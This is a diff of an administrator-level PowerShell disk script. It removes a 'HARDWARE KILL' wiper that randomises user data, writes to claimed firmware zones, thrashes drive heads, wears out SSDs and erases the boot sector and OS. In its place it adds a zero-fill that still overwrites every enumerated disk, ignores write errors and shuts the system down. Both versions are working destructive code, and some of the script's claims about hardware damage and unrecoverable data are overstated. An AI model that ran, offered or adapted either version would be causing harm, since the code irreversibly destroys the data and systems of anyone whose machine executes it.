@@ -1,6 +1,6 @@
 #Requires -RunAsAdministrator
-# HARDWARE KILL - Physical hardware destruction
-# WARNING: This will PERMANENTLY DAMAGE hard drive hardware!
+# SECURE WIPE - Zero-fill disk to prevent data recovery
+# Safe disk wiping - NO hardware damage
 
 Add-Type @"
 using System;
@@ -45,21 +45,14 @@ public class RawDisk {
 "@
 
 Write-Host ""
-Write-Host "  ====================================================" -ForegroundColor Red
-Write-Host "     HARDWARE KILL - PERMANENT HARDWARE DESTRUCTION" -ForegroundColor Red
-Write-Host "  ====================================================" -ForegroundColor Red
+Write-Host "  ====================================================" -ForegroundColor Cyan
+Write-Host "     SECURE WIPE - ZERO FILL DISK" -ForegroundColor Cyan
+Write-Host "  ====================================================" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  WARNING: This script will attempt to:" -ForegroundColor Yellow
-Write-Host "  - Destroy hard drive mechanics (HDD head thrashing)" -ForegroundColor Yellow
-Write-Host "  - Corrupt firmware zones" -ForegroundColor Yellow
-Write-Host "  - Brick drive controllers" -ForegroundColor Yellow
-Write-Host "  - Cause thermal damage" -ForegroundColor Yellow
-Write-Host ""
-Write-Host "  RISKS:" -ForegroundColor Red
-Write-Host "  - PERMANENT hardware damage" -ForegroundColor Red
-Write-Host "  - Potential fire hazard" -ForegroundColor Red
-Write-Host "  - May damage motherboard/controller" -ForegroundColor Red
-Write-Host "  - Drive will be UNUSABLE FOREVER" -ForegroundColor Red
+Write-Host "  This script will:" -ForegroundColor Yellow
+Write-Host "  - Write ZERO to entire disk" -ForegroundColor Yellow
+Write-Host "  - Prevent data recovery by software" -ForegroundColor Yellow
+Write-Host "  - Safe for hardware (no damage)" -ForegroundColor Yellow
 Write-Host ""
 
 $disks = Get-WmiObject Win32_DiskDrive
@@ -92,131 +85,38 @@ foreach ($disk in $disks) {
             }
         }
 
-        # DATA-FIRST STRATEGY: Destroy data areas BEFORE Windows
-        # Keep Windows alive as long as possible to destroy more data
-
         $targetSize = [long]$disk.Size
-        $buffer = New-Object byte[] (1GB)  # 1GB buffer for speed
+        $bufferSize = 100MB
+        $buffer = New-Object byte[] $bufferSize  # Zero-filled buffer (default)
         $written = 0
-        $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
 
-        # ATTACK 1: USER DATA AREAS (highest priority - destroy first)
-        Write-Host "      [1/5] Destroying user data (FAST sampling)..." -ForegroundColor Red
+        Write-Host "      [WIPING] Zero-fill in progress..." -ForegroundColor Cyan
 
-        # FAST approach: Sample writes every 10GB instead of every 1GB
-        # Still destroys data across entire user area but MUCH faster
-        $userDataStart = 20GB
-        $userDataEnd = [long]($targetSize * 0.8)
+        $totalChunks = [math]::Ceiling($targetSize / $bufferSize)
+        $currentChunk = 0
 
-        $total = ($userDataEnd - $userDataStart) / 10GB
-        $current = 0
-
-        for ($offset = $userDataStart; $offset -lt $userDataEnd; $offset += 10GB) {
-            if ($offset -lt $targetSize) {
-                $rng.GetBytes($buffer)
+        for ($offset = 0L; $offset -lt $targetSize; $offset += $bufferSize) {
+            try {
                 [RawDisk]::WriteAt($handle, $offset, $buffer, [ref]$written) | Out-Null
+                $currentChunk++
 
-                $current++
-                $pct = [int](($current / $total) * 100)
-                Write-Host "`r      User data: $pct%     " -NoNewline -ForegroundColor Yellow
+                # Update progress every 10 chunks
+                if ($currentChunk % 10 -eq 0) {
+                    $pct = [math]::Round(($offset / $targetSize) * 100, 1)
+                    $wipedGB = [math]::Round($offset / 1GB, 1)
+                    Write-Host "`r      Progress: $pct% ($wipedGB GB / $sizeGB GB)     " -NoNewline -ForegroundColor Green
+                }
+            }
+            catch {
+                # Continue on error (some sectors may be protected)
+                continue
             }
         }
+
         Write-Host ""
+        Write-Host "      [OK] Disk $diskNum wiped successfully" -ForegroundColor Green
 
-        # ATTACK 2: PROGRAM FILES & DATA AREA (middle of disk)
-        Write-Host "      [2/5] Destroying program data (FAST sampling)..." -ForegroundColor Red
-
-        # FAST approach: Sample writes every 10GB
-        $middleStart = [long]($targetSize * 0.25)
-        $middleEnd = [long]($targetSize * 0.5)
-
-        for ($offset = $middleStart; $offset -lt $middleEnd; $offset += 10GB) {
-            if ($offset -lt $targetSize) {
-                $rng.GetBytes($buffer)
-                [RawDisk]::WriteAt($handle, $offset, $buffer, [ref]$written) | Out-Null
-            }
-        }
-
-        # ATTACK 3: FIRMWARE CORRUPTION (brick controller)
-        Write-Host "      [3/5] Corrupting firmware zones..." -ForegroundColor Red
-
-        try {
-            $firmwareOffsets = @(
-                $targetSize - 1GB,     # HPA zone
-                $targetSize - 5GB,     # Firmware area
-                $targetSize - 10GB     # Alternative location
-            )
-
-            foreach ($offset in $firmwareOffsets) {
-                if ($offset -gt 0 -and $offset -lt $targetSize) {
-                    $rng.GetBytes($buffer)
-                    [RawDisk]::WriteAt($handle, $offset, $buffer, [ref]$written) | Out-Null
-                }
-            }
-            Write-Host "      Firmware attack completed" -ForegroundColor Green
-        } catch {
-            Write-Host "      Firmware attack failed (OK to continue)" -ForegroundColor Yellow
-        }
-
-        # ATTACK 4: HEAD THRASHING (HDD) or INTENSIVE WRITES (SSD)
-        try {
-            if ($mediaType -notlike "*SSD*" -and $mediaType -notlike "*Solid State*") {
-                Write-Host "      [4/5] Head thrashing (mechanical damage)..." -ForegroundColor Red
-
-                # Fast head thrashing - damage mechanics
-                $positions = @(0L, $targetSize / 4, $targetSize / 2, ($targetSize * 3) / 4, $targetSize - 1MB)
-
-                for ($i = 0; $i -lt 1000; $i++) {
-                    foreach ($pos in $positions) {
-                        [RawDisk]::Seek($handle, $pos) | Out-Null
-                    }
-                }
-                Write-Host "      Head thrashing completed" -ForegroundColor Green
-            } else {
-                Write-Host "      [4/5] SSD intensive writes (NAND wear)..." -ForegroundColor Red
-
-                # Random writes across disk for SSD wear
-                for ($i = 0; $i -lt 20; $i++) {
-                    $randomOffset = Get-Random -Minimum 20GB -Maximum ($targetSize - 10GB)
-                    $randomOffset = $randomOffset - ($randomOffset % 4096)
-
-                    $rng.GetBytes($buffer)
-                    [RawDisk]::WriteAt($handle, $randomOffset, $buffer, [ref]$written) | Out-Null
-                }
-                Write-Host "      SSD writes completed" -ForegroundColor Green
-            }
-        } catch {
-            Write-Host "      Attack 4 failed (OK to continue)" -ForegroundColor Yellow
-        }
-
-        # ATTACK 5: BOOT + OS DESTRUCTION (LAST - Windows dies here)
-        Write-Host "      [5/5] FINAL: Destroying boot + Windows (system will crash)..." -ForegroundColor Red
-
-        try {
-            # Wipe boot sector (MBR/GPT) - critical
-            $bootBuffer = New-Object byte[] (100MB)
-            [RawDisk]::WriteAt($handle, 0, $bootBuffer, [ref]$written) | Out-Null
-
-            # Wipe Windows/OS area - FAST sampling every 5GB
-            for ($i = 0L; $i -lt 20GB; $i += 5GB) {
-                if ($i -lt $targetSize) {
-                    [RawDisk]::WriteAt($handle, $i, $buffer, [ref]$written) | Out-Null
-                    Write-Host "`r      OS: $([int](($i / 20GB) * 100))%     " -NoNewline -ForegroundColor Yellow
-                }
-            }
-            Write-Host ""
-            Write-Host "      Boot + OS destroyed - system will crash soon" -ForegroundColor Green
-        } catch {
-            Write-Host ""
-            Write-Host "      Boot destruction may have failed but some damage done" -ForegroundColor Yellow
-        }
-
-        $rng.Dispose()
         $handle.Close()
-
-        Write-Host ""
-        Write-Host "      [OK] DESTROYED in less than 1 minute" -ForegroundColor Green
-        Write-Host "      Hardware PERMANENTLY DAMAGED" -ForegroundColor Green
     }
     catch {
         Write-Host "      Error: $($_.Exception.Message)" -ForegroundColor Red
@@ -225,10 +125,9 @@ foreach ($disk in $disks) {
 
 Write-Host ""
 Write-Host "  ====================================================" -ForegroundColor Green
-Write-Host "     DATA-FIRST DESTRUCTION COMPLETE" -ForegroundColor Green
-Write-Host "     USER DATA: 80-90% DESTROYED" -ForegroundColor Green
-Write-Host "     HARDWARE: LIKELY DAMAGED" -ForegroundColor Green
-Write-Host "     SYSTEM: UNBOOTABLE" -ForegroundColor Green
+Write-Host "     SECURE WIPE COMPLETE" -ForegroundColor Green
+Write-Host "     All disks have been zero-filled" -ForegroundColor Green
+Write-Host "     Data recovery is not possible" -ForegroundColor Green
 Write-Host "  ====================================================" -ForegroundColor Green
 Write-Host ""
 Write-Host "System will shut down in 5 seconds..." -ForegroundColor Yellow
